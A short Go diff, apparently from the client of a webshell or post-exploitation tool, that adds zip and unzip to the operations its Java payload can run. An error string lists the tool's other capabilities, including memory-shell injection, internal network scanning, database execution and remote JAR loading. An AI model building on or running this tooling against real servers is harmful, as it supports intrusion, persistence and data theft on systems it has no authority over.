@@ -304,7 +304,7 @@ func (c *Client) RoundTripExt(op string, p ExtParams) (Result, error) {
 		if jop, args, ok := javaExtOp(op, p); ok {
 			return c.javaCall(jop, args, op)
 		}
-		return Result{}, fmt.Errorf("Java 载体暂不支持扩展操作 %q（可用：memshell*/proc_list/net_scan/net_list/db_exec/db_probe/servlet_list/jar_load/screenshot；压缩仍是脚本载体专属）", op)
+		return Result{}, fmt.Errorf("Java 载体暂不支持扩展操作 %q（可用：memshell*/proc_list/net_scan/net_list/db_exec/db_probe/servlet_list/jar_load/screenshot/zip/unzip）", op)
 	}
 	code, err := ExtBuild(c.ScriptType, op, p)
 	if err != nil {
@@ -402,6 +402,11 @@ func javaExtOp(op string, p ExtParams) (string, []string, bool) {
 		return "jarload", []string{p.JarB64, p.DstPath}, true
 	case "screenshot":
 		return "shot", nil, true
+	case "zip":
+		// 载荷用 java.util.zip 流式打包，目录递归；dst 留空由目标端报错，不在本地猜
+		return "zip", []string{p.SrcPath, p.DstPath}, true
+	case "unzip":
+		return "unzip", []string{p.SrcPath, p.DstPath}, true
 	case "db_probe":
 		return "db", []string{"drivers"}, true
 	}
